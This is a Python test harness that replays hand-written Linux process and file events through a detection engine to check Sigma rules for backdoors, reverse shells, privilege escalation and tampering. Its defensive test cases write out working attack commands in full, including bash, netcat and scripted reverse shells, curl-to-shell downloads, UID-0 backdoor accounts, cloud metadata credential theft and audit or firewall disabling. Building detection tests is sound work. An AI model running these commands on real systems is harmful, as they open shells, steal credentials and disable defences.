"""Check Linux rule logic with the real engine: positives and near-miss negatives.

Replays hand-written events, so it needs no sensor. Each case names the rule
that must (or must not) alert for one event; every other loaded rule is
ignored for that event.
"""

import argparse
import hashlib
import json
import shutil
import subprocess
import tempfile
from pathlib import Path

BACKDOOR = "Backdoor Account Creation (Duplicate UID 0)"
DEV_TCP = "Linux Reverse Shell via /dev/tcp"
NC = "Netcat or Socat Reverse Shell Execution"
KMOD = "Kernel Module Load from Suspicious Path"
CHMOD = "SUID/SGID Bit Added via chmod"
B64 = "Base64-Decode Piped to Shell"
DLPIPE = "Linux Download and Execute Piped to Shell"
SUDOERS = "Sudoers Configuration Tampering"
SSHD = "SSH Daemon Configuration Tampering"
KEYS = "SSH authorized_keys Written"
SCRIPTED = "Scripted Reverse Shell via Python, Perl, PHP or Ruby"
AUDITCTL = "Linux Audit Rules Deleted or Auditing Disabled"
PAM = "PAM Configuration or Module Tampering"
METADATA = "Cloud Instance Metadata Credential Request from the Command Line"
MINER = "Cryptominer Command Line"
PRIVILEGED_CONTAINER = "Privileged Container or Host Root Mount"
NSENTER = "Nsenter Targeting PID 1 from a Container"
DOCKER_SOCKET = "Docker CLI or Socket Access from a Container"
IMMUTABLE = "Immutable Attribute Added to Linux Persistence Paths"
FIREWALL = "Linux Firewall Rules Flushed or Firewall Disabled"
SETCAP = "Dangerous Linux File Capability Grant Attempt via setcap"
SSH_RC = "Linux SSH Startup File Written"
ACCOUNT_DB = "Linux Local Account Database Written by an Unexpected Process"

RULE_FILES = {
    BACKDOOR: "proc_creation_lnx_backdoor_account.yml",
    DEV_TCP: "proc_creation_lnx_shell_dev_tcp_reverse_shell.yml",
    NC: "proc_creation_lnx_nc_exec_reverse_shell.yml",
    KMOD: "proc_creation_lnx_kmod_load_susp_path.yml",
    CHMOD: "proc_creation_lnx_chmod_suid.yml",
    B64: "proc_creation_lnx_base64_pipe_shell.yml",
    DLPIPE: "proc_creation_lnx_download_pipe_shell.yml",
    SUDOERS: "file_event_lnx_sudoers_tamper.yml",
    SSHD: "file_event_lnx_sshd_config_tamper.yml",
    KEYS: "file_event_lnx_ssh_authorized_keys.yml",
    SCRIPTED: "proc_creation_lnx_scripted_reverse_shell.yml",
    AUDITCTL: "proc_creation_lnx_auditctl_disabled.yml",
    PAM: "file_event_lnx_pam_tamper.yml",
    METADATA: "proc_creation_lnx_cloud_metadata_credentials.yml",
    MINER: "proc_creation_lnx_cryptominer_cmdline.yml",
    PRIVILEGED_CONTAINER: "proc_creation_lnx_privileged_container.yml",
    NSENTER: "proc_creation_lnx_nsenter_container.yml",
    DOCKER_SOCKET: "proc_creation_lnx_docker_socket_container.yml",
    IMMUTABLE: "proc_creation_lnx_chattr_immutable_persistence.yml",
    FIREWALL: "proc_creation_lnx_firewall_disabled.yml",
    SETCAP: "proc_creation_lnx_setcap_dangerous_grant.yml",
    SSH_RC: "file_event_lnx_ssh_startup_file.yml",
    ACCOUNT_DB: "file_event_lnx_account_database_write.yml",
}

# (rule, Image, CommandLine, alerts)
PROCESS_CASES = [
    # setcap: a named capability is raised in a complete capability expression.
    (SETCAP, "/usr/sbin/setcap", "setcap cap_setuid=ep /opt/helper", True),
    (SETCAP, "/usr/sbin/setcap", "setcap -n 1000 CAP_SETGID=p /opt/helper", True),
    (SETCAP, "/usr/sbin/setcap", "setcap cap_sys_admin,cap_chown+ep /opt/helper", True),
    (SETCAP, "/usr/sbin/setcap", "setcap cap_chown,cap_dac_override=ep /opt/helper", True),
    (SETCAP, "/sbin/setcap", 'setcap "cap_chown=p cap_dac_read_search=ep" /opt/helper', True),
    (SETCAP, "/usr/sbin/setcap", "setcap cap_sys_ptrace=+p /opt/helper", True),
    (SETCAP, "/usr/sbin/setcap", "setcap cap_sys_module=ep /opt/helper", True),
    (SETCAP, "/usr/sbin/setcap", "setcap cap_net_raw=ep /opt/helper", True),
    (SETCAP, "/usr/sbin/setcap", "setcap all=p /opt/helper", True),
    (
        SETCAP,
        "/opt/rustinel_atomic_setcap.d/setcap",
        "/opt/rustinel_atomic_setcap.d/setcap -c sleep 1; : cap_setuid=ep /opt/dummy",
        True,
    ),
    (SETCAP, "/usr/sbin/setcap", "setcap -q -v cap_net_raw=ep /usr/bin/ping", False),
    (SETCAP, "/usr/sbin/setcap", "setcap -r /usr/bin/ping", False),
    (SETCAP, "/usr/sbin/setcap", "setcap cap_setuid= /opt/helper", False),
    (SETCAP, "/usr/sbin/setcap", "setcap cap_setuid-ep /opt/helper", False),
    (SETCAP, "/usr/sbin/setcap", "setcap cap_net_raw_backup=ep /opt/helper", False),
    (SETCAP, "/usr/sbin/setcap", "setcap cap_net_bind_service=ep /opt/cap_setuid=ep", False),
    (SETCAP, "/usr/sbin/setcap", "setcap cap_setuid=ep", False),
    (SETCAP, "/usr/sbin/getcap", "getcap cap_setuid=ep /opt/helper", False),
    # Duplicate UID 0: the UID must be 0; --non-unique alone is not enough.
    (BACKDOOR, "/usr/sbin/useradd", "useradd -o -u 0 -g 0 backdoor", True),
    (BACKDOOR, "/usr/sbin/useradd", "useradd --non-unique --uid=0 backdoor", True),
    (BACKDOOR, "/usr/sbin/usermod", "usermod -u 0 -o svc", True),
    (BACKDOOR, "/usr/sbin/useradd", "useradd -ou0 backdoor", True),
    (BACKDOOR, "/usr/sbin/useradd", "useradd --non-unique -u 1001 svc", False),
    (BACKDOOR, "/usr/sbin/useradd", "useradd -o svc", False),
    (BACKDOOR, "/usr/sbin/useradd", "useradd -u 1000 -g 0 svc", False),
    (BACKDOOR, "/usr/sbin/useradd", "useradd -u 0123 svc", False),
    # /dev/tcp: only shells that implement it, wired to a stream.
    (DEV_TCP, "/usr/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", True),
    (DEV_TCP, "/usr/bin/bash", "bash -c 'exec 5<>/dev/tcp/203.0.113.9/4444; cat <&5 >&5'", True),
    (DEV_TCP, "/usr/bin/ksh", "ksh -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", True),
    (DEV_TCP, "/usr/bin/dash", "dash -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", False),
    (DEV_TCP, "/usr/bin/zsh", "zsh -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", False),
    (DEV_TCP, "/usr/bin/bash", "bash -c 'echo ping > /dev/tcp/203.0.113.9/80'", False),
    # nc / socat: an execute flag with a shell, not a bare -c (TLS on OpenBSD nc).
    (NC, "/usr/bin/nc", "nc -lvnp 4444 -e /bin/sh", True),
    (NC, "/usr/bin/nc", "nc 203.0.113.9 4444 -c /bin/bash", True),
    (NC, "/usr/bin/ncat", "ncat --exec /bin/sh 203.0.113.9 4444", True),
    (NC, "/usr/bin/socat", "socat TCP:203.0.113.9:4444 EXEC:/bin/sh", True),
    (NC, "/usr/bin/nc", "nc -c 203.0.113.9 443", False),
    (NC, "/usr/bin/nc", "nc -zv 203.0.113.9 22", False),
    # Kernel modules: insmod by path; modprobe only for a .ko path or config.
    (KMOD, "/usr/sbin/insmod", "insmod /tmp/diamorphine.ko", True),
    (KMOD, "/usr/sbin/modprobe", "modprobe /dev/shm/evil.ko", True),
    (KMOD, "/usr/sbin/modprobe", "modprobe -C /tmp/modprobe.conf nf_tables", True),
    (KMOD, "/usr/sbin/insmod", "insmod /lib/modules/6.1.0/kernel/net/foo.ko", False),
    (KMOD, "/usr/sbin/modprobe", "modprobe nf_tables", False),
    (KMOD, "/usr/sbin/modprobe", "modprobe -n -v home_dir_mod", False),
    (KMOD, "/usr/sbin/modprobe", "modprobe --show-depends /home/notes.txt", False),
    # chmod: the mode is the first non-option argument.
    (CHMOD, "/usr/bin/chmod", "chmod u+s /bin/bash", True),
    (CHMOD, "/usr/bin/chmod", "chmod +s /bin/bash", True),
    (CHMOD, "/usr/bin/chmod", "chmod -R a-x,u+s /srv/app", True),
    (CHMOD, "/usr/bin/chmod", "chmod 4755 /tmp/helper", True),
    (CHMOD, "/usr/bin/chmod", "chmod 02755 /tmp/helper", True),
    (CHMOD, "/usr/bin/chmod", "chmod 755 /usr/local/bin/tool", False),
    (CHMOD, "/usr/bin/chmod", "chmod 644 4755", False),
    (CHMOD, "/usr/bin/chmod", "chmod u-s /bin/bash", False),
    (CHMOD, "/usr/bin/chmod", "chmod 1777 /tmp/shared", False),
    (CHMOD, "/usr/bin/chmod", "chmod 600 u+s", False),
    # base64: the decode flag belongs to base64 and a shell is the next stage.
    (B64, "/usr/bin/bash", "bash -c 'echo aWQK | base64 -d | bash'", True),
    (B64, "/usr/bin/bash", "bash -c 'base64 --decode payload.b64 | sh -s'", True),
    (B64, "/usr/bin/bash", "bash -c 'cat p | base64 -d | /bin/sh'", True),
    (B64, "/usr/bin/bash", "bash -c 'base64 -d payload.b64 > out.bin'", False),
    (B64, "/usr/bin/bash", "bash -c 'echo hi | base64; ls -d /tmp | sh'", False),
    (B64, "/usr/bin/bash", "bash -c 'base64 -d p | gunzip | tee out; echo done | shasum'", False),
    # download | interpreter: the pipe target is a whole word, not a prefix.
    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | bash'", True),
    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a|sh'", True),
    (DLPIPE, "/usr/bin/bash", "bash -c 'wget -qO- http://203.0.113.9/a | sudo -E bash -s'", True),
    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | /bin/sh'", True),
    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | python3 -'", True),
    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | sha256sum'", False),
    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | shasum -a 256'", False),
    (DLPIPE, "/usr/bin/bash", "bash -c 'wget -qO- http://203.0.113.9/a | tar xz'", False),
    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | tee a.sh'", False),
    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a -o a.sh'", False),
    # Scripted reverse shells: socket, connect and a shell, in a script interpreter.
    (
        SCRIPTED,
        "/usr/bin/python3",
        'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("203.0.113.9",4444));os.dup2(s.fileno(),0);pty.spawn("/bin/sh")\'',  # noqa: E501
        True,
    ),
    (
        SCRIPTED,
        "/usr/bin/perl",
        'perl -e \'use Socket;socket(S,PF_INET,SOCK_STREAM,6);connect(S,sockaddr_in(4444,inet_aton("203.0.113.9")));open(STDIN,">&S");exec("/bin/sh -i");\'',  # noqa: E501
        True,
    ),
    (
        SCRIPTED,
        "/usr/bin/php8.2",
        'php -r \'$s=fsockopen("203.0.113.9",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
        True,
    ),
    (
        SCRIPTED,
        "/usr/bin/ruby",
        'ruby -rsocket -e \'s=TCPSocket.open("203.0.113.9",4444);exec("/bin/sh -i")\'',
        True,
    ),
    (SCRIPTED, "/usr/bin/python3", 'python3 -c "import socket;print(socket.gethostname())"', False),
    (SCRIPTED, "/usr/bin/bash", "bash -c 'python3 -c socket.socket connect( dup2'", False),
    # auditctl: -D and -e 0 only, case-sensitive.
    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -D", True),
    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -e 0", True),
    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -e0", True),
    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -e 1", False),
    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -d exit,always -S open", False),
    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -l", False),
    # Cloud metadata: credential paths only.
    (
        METADATA,
        "/usr/bin/curl",
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
        True,
    ),
    (
        METADATA,
        "/usr/bin/wget",
        "wget -qO- http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        True,
    ),
    (
        METADATA,
        "/usr/bin/curl",
        "curl -s http://169.254.169.254/latest/meta-data/instance-id",
        False,
    ),
    # Miner command lines.
    (MINER, "/tmp/.x/kworker", "kworker -o stratum+tcp://pool.example:3333 -u wallet", True),
    (MINER, "/opt/miner", "miner --donate-level 1 -o pool.example:443", True),
    (MINER, "/usr/bin/curl", "curl http://example.com:3333/health", False),
    # Container creation: each supported CLI and each risky flag.
    (PRIVILEGED_CONTAINER, "/usr/bin/docker", "docker run --privileged image", True),
    (PRIVILEGED_CONTAINER, "/usr/bin/podman", "podman run --pid=host image", True),
    (PRIVILEGED_CONTAINER, "/usr/bin/nerdctl", "nerdctl run -v /:/host image", True),
    (PRIVILEGED_CONTAINER, "/usr/bin/docker", "docker create --volume=/:/host image", True),
    (
        PRIVILEGED_CONTAINER,
        "/usr/bin/docker",
        "docker container run --mount type=bind,source=/,target=/host image",
        True,
    ),
    (
        PRIVILEGED_CONTAINER,
        "/usr/bin/docker",
        "docker run --mount=type=bind,source=/srv,target=/host image",
        False,
    ),
    (PRIVILEGED_CONTAINER, "/usr/bin/docker", "docker run --privileged=false image", False),
    (PRIVILEGED_CONTAINER, "/usr/bin/docker", "docker inspect --format=--privileged image", False),
    # chattr: cover each persistence path family and attribute polarity.
    (IMMUTABLE, "/usr/bin/chattr", "chattr +i /var/spool/cron/crontabs/root", True),
    (IMMUTABLE, "/usr/bin/chattr", "chattr +ia /root/.ssh/authorized_keys", True),
    (IMMUTABLE, "/usr/bin/chattr", "chattr +i /etc/ld.so.preload", True),
    (IMMUTABLE, "/usr/bin/chattr", "chattr +i /run/systemd/system/app.service", True),
    (IMMUTABLE, "/usr/bin/chattr", "chattr +i /etc/pam.d/sshd", True),
    (IMMUTABLE, "/usr/bin/chattr", "chattr +i /lib64/security/pam_unix.so", True),
    (IMMUTABLE, "/usr/bin/chattr", "chattr +i /etc/sudoers.d/app", True),
    (IMMUTABLE, "/usr/bin/chattr", "chattr -i /etc/ld.so.preload", False),
    (IMMUTABLE, "/usr/bin/chattr", "chattr +i /etc/ld.so.preload.bak", False),
    # Firewall verbs, resolved iptables image, and similar read-only commands.
    (FIREWALL, "/usr/sbin/iptables", "iptables -F", True),
    (FIREWALL, "/usr/sbin/xtables-nft-multi", "iptables -t nat --flush", True),
    (FIREWALL, "/usr/sbin/nft", "nft flush ruleset", True),
    (FIREWALL, "/usr/sbin/ufw", "ufw --force disable", True),
    (FIREWALL, "/usr/bin/systemctl", "systemctl stop firewalld", True),
    (FIREWALL, "/usr/bin/systemctl", "systemctl disable --now firewalld.service", True),
    (FIREWALL, "/usr/sbin/iptables", "iptables -L", False),
    (FIREWALL, "/usr/sbin/nft", "nft list ruleset", False),
    (FIREWALL, "/usr/sbin/ufw", "ufw status", False),
    (FIREWALL, "/usr/bin/systemctl", "systemctl stop firewalld-helper.service", False),
    (FIREWALL, "/usr/bin/systemctl", "systemctl is-enabled firewalld", False),
    # The live atomics use copied shells with these exact arguments.
    (
        PRIVILEGED_CONTAINER,
        "/opt/rustinel_atomic_privileged_container.d/docker",
        "/opt/rustinel_atomic_privileged_container.d/docker -c sleep 1; :"
        " run --privileged placeholder",
        True,
    ),
    (
        IMMUTABLE,
        "/opt/rustinel_atomic_chattr_immutable_persistence.d/chattr",
        "/opt/rustinel_atomic_chattr_immutable_persistence.d/chattr -c sleep 1; : +i /etc/crontab",
        True,
    ),
    (
        FIREWALL,
        "/opt/rustinel_atomic_firewall_disabled.d/nft",
        "/opt/rustinel_atomic_firewall_disabled.d/nft -c sleep 1; : flush ruleset",
        True,
    ),
]

CONTAINER_ID = "1a2b3c4d5e6f"
DOCKER_CURL = "curl --unix-socket /var/run/docker.sock http://localhost/version"
# (rule, Image, CommandLine, ContainerId, alerts)
CONTAINER_CASES = [
    (NSENTER, "/usr/bin/nsenter", "nsenter -t 1 --mount", CONTAINER_ID, True),
    (NSENTER, "/usr/bin/nsenter", "nsenter -t1", CONTAINER_ID, True),
    (NSENTER, "/usr/bin/nsenter", "nsenter --target 1", CONTAINER_ID, True),
    (NSENTER, "/usr/bin/nsenter", "nsenter --target=1", CONTAINER_ID, True),
    (NSENTER, "/usr/bin/nsenter", "nsenter -t 10", CONTAINER_ID, False),
    (NSENTER, "/usr/bin/nsenter", "nsenter --mount", CONTAINER_ID, False),
    (NSENTER, "/usr/bin/nsenter", "nsenter -t 1", None, False),
    (NSENTER, "/usr/bin/nsenter", "nsenter -t 1", "", False),
    (DOCKER_SOCKET, "/usr/bin/curl", DOCKER_CURL, CONTAINER_ID, True),
    (
        DOCKER_SOCKET,
        "/usr/bin/curl",
        "curl --unix-socket /run/docker.sock http://localhost/version",
        CONTAINER_ID,
        True,
    ),
    (DOCKER_SOCKET, "/usr/bin/docker", "docker ps", CONTAINER_ID, True),
    (DOCKER_SOCKET, "/usr/bin/docker", "docker ps", None, False),
    (DOCKER_SOCKET, "/usr/bin/docker", "docker ps", "", False),
    (DOCKER_SOCKET, "/usr/bin/curl", DOCKER_CURL, None, False),
    (
        DOCKER_SOCKET,
        "/usr/bin/curl",
        "curl --unix-socket /var/run/docker.sock.backup http://localhost/version",
        CONTAINER_ID,
        False,
    ),
    (
        DOCKER_SOCKET,
        "/usr/bin/curl",
        "curl http://localhost/var/run/docker.sock",
        CONTAINER_ID,
        False,
    ),
]

PKG = "/usr/bin/dpkg"
# (rule, Image, TargetFilename, alerts)
FILE_CASES = [
    (SUDOERS, "/bin/sh", "/etc/sudoers.d/90-backdoor", True),
    (SUDOERS, PKG, "/etc/sudoers.d/90-cloud-init-users", False),
    (SUDOERS, "/usr/bin/rpm", "/etc/sudoers", False),
    (SSHD, "/bin/sh", "/etc/ssh/sshd_config", True),
    (SSHD, PKG, "/etc/ssh/sshd_config", False),
    (SSHD, "/usr/bin/apt-get", "/etc/ssh/sshd_config.d/10-hardening.conf", False),
    (KEYS, "/bin/sh", "/root/.ssh/authorized_keys", True),
    (KEYS, "/usr/bin/python3", "/home/app/.ssh/authorized_keys2", True),
    (KEYS, PKG, "/root/.ssh/authorized_keys", False),
    (PAM, "/bin/sh", "/etc/pam.d/sshd", True),
    (PAM, "/usr/bin/python3", "/lib/x86_64-linux-gnu/security/pam_unix.so", True),
    (PAM, PKG, "/etc/pam.d/common-auth", False),
    (PAM, "/usr/sbin/pam-auth-update", "/etc/pam.d/common-session", False),
    (PAM, "/bin/sh", "/etc/hostname", False),
    (SSH_RC, "/bin/sh", "/home/alice/.ssh/rc", True),
    (SSH_RC, "/usr/bin/vim", "/etc/ssh/sshrc", True),
    (SSH_RC, PKG, "/etc/ssh/sshrc", False),
    (SSH_RC, PKG, "/root/.ssh/rc", True),
    (SSH_RC, "/bin/sh", "/home/alice/.ssh/rc.bak", False),
    (SSH_RC, "/bin/sh", "/home/alice/.SSH/RC", False),
    (SSH_RC, "/usr/bin/vim", "/tmp/rootfs/etc/ssh/sshrc", False),
    (ACCOUNT_DB, "/usr/bin/tee", "/etc/passwd", True),
    (ACCOUNT_DB, "/bin/sed", "/etc/shadow", True),
    (ACCOUNT_DB, None, "/etc/passwd", True),
    (ACCOUNT_DB, "/usr/sbin/useradd", "/etc/passwd", False),
    (ACCOUNT_DB, "/sbin/usermod", "/etc/shadow", False),
    (ACCOUNT_DB, "/usr/bin/passwd", "/etc/shadow", False),
    (ACCOUNT_DB, "/bin/rpm", "/etc/passwd", False),
    (ACCOUNT_DB, "/bin/sh", "/etc/passwd.bak", False),
    (ACCOUNT_DB, "/bin/sh", "/mnt/rootfs/etc/shadow", False),
]

# (rule, Image, SourceFilename, TargetFilename, alerts)
RENAME_CASES = [
    (ACCOUNT_DB, "/usr/bin/mv", "/etc/passwd.tmp", "/etc/passwd", True),
    (ACCOUNT_DB, "/usr/bin/mv", "/etc/shadow.tmp", "/etc/shadow", True),
    (ACCOUNT_DB, "/usr/bin/mv", "/etc/shadow", "/etc/shadow.old", False),
    (ACCOUNT_DB, "/usr/sbin/vipw", "/etc/passwd.edit", "/etc/passwd", False),
]


def process_event(index, image, command_line, container_id=None):
    fields = {"ProcessId": str(index), "Image": image, "CommandLine": command_line}
    if container_id is not None:
        fields["ContainerId"] = container_id
    return {
        "category": "Process",
        "event_id": 1,
        "fields": fields,
    }


def file_event(index, image, path, source=None):
    fields = {"ProcessId": str(index), "TargetFilename": path}
    if image is not None:
        fields["Image"] = image
    if source is not None:
        fields["SourceFilename"] = source
    return {
        "category": "File",
        "event_id": 11 if source is None else 71,
        "fields": fields,
    }


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--engine", required=True, type=Path)
    args = parser.parse_args()
    engine = args.engine.resolve()
    repo = Path(__file__).resolve().parents[2]
    timestamp = "2026-10-08T08:00:00Z"

    events = []
    expected = set()
    cases = []
    for rule, image, command_line, alerts in PROCESS_CASES:
        cases.append((rule, alerts, lambda i, a=image, c=command_line: process_event(i, a, c)))
    for rule, image, command_line, container_id, alerts in CONTAINER_CASES:
        cases.append(
            (
                rule,
                alerts,
                lambda i, a=image, c=command_line, d=container_id: process_event(i, a, c, d),
            )
        )
    for rule, image, path, alerts in FILE_CASES:
        cases.append((rule, alerts, lambda i, a=image, p=path: file_event(i, a, p)))
    for rule, image, source, path, alerts in RENAME_CASES:
        cases.append((rule, alerts, lambda i, a=image, p=path, s=source: file_event(i, a, p, s)))
    for index, (rule, alerts, build) in enumerate(cases, 1):
        event = build(index)
        event.update(
            event_time=timestamp,
            ingest_seq=index,
            platform="linux",
            provider="ebpf",
            opcode=1,
        )
        events.append(event)
        if alerts:
            expected.add((index, rule))

    with tempfile.TemporaryDirectory(prefix="rustinel-logic-replay-") as directory:
        root = Path(directory)
        rules = root / "sigma"
        rules.mkdir()
        for name in RULE_FILES.values():
            source = next((repo / "rules/sigma/linux").glob(name))
            shutil.copyfile(source, rules / source.name)
        payload = root / "cases.ndjson"
        data = "".join(json.dumps(event) + "\n" for event in events).encode()
        payload.write_bytes(data)
        payload.with_suffix(".manifest.json").write_text(
            json.dumps(
                {
                    "schema_version": 2,
                    "payload": payload.name,
                    "rustinel_version": json.loads(
                        (repo / "compatibility/engine.json").read_text()
                    )["version"],
                    "platform": "linux",
                    "started_at": timestamp,
                    "ended_at": timestamp,
                    "status": "complete",
                    "events": {
                        "received": len(events),
                        "written": len(events),
                        "lost": 0,
                        "source_lost": 0,
                    },
                    "payload_bytes": len(data),
                    "payload_sha256": hashlib.sha256(data).hexdigest(),
                }
            )
        )
        config = root / "config.toml"
        config.write_text(
            f"[scanner]\nsigma_rules_path = {json.dumps(str(rules))}\n"
            'sigma_match_mode = "all"\nyara_enabled = false\n'
            "[ioc]\nenabled = false\n[dedup]\nenabled = false\n"
            f"[logging]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
            f"[alerts]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
        )
        output = root / "alerts.ndjson"
        subprocess.run(
            [str(engine), "replay", str(payload), "--config", str(config), "--output", str(output)],
            check=True,
            timeout=30,
        )
        alerts = [json.loads(line) for line in output.read_text().splitlines()]
        actual = {(alert["process.pid"], alert["rule.name"]) for alert in alerts}
        if actual != expected or len(alerts) != len(expected):
            raise RuntimeError(
                f"Missing alerts: {sorted(expected - actual)}; "
                f"unexpected alerts: {sorted(actual - expected)}"
            )
        print(f"Passed {len(cases)} logic replay cases ({len(expected)} expected alerts).")


if __name__ == "__main__":
    main()
